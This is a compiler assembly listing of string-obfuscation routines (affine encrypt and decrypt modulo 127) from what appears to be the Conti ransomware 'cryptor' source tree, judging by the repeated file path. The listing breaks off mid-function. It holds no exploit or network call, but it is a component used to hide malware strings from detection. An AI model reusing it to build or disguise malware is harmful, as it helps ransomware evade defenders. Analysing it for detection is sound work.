?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 78 00 00 00	 mov	 ecx, 120		; 00000078H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 78	 add	 r8d, 120		; 00000078H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0d 00 00 00	 mov	 ecx, 13
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 0d
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+13]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 66 00 00 00	 mov	 ecx, 102		; 00000066H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 66	 add	 r8d, 102		; 00000066H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5d	 sub	 eax, 93			; 0000005dH
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5d	 add	 r8d, 93			; 0000005dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 46	 sub	 eax, 70			; 00000046H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 46	 add	 r8d, 70			; 00000046H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 75	 sub	 eax, 117		; 00000075H
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 75	 add	 r8d, 117		; 00000075H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
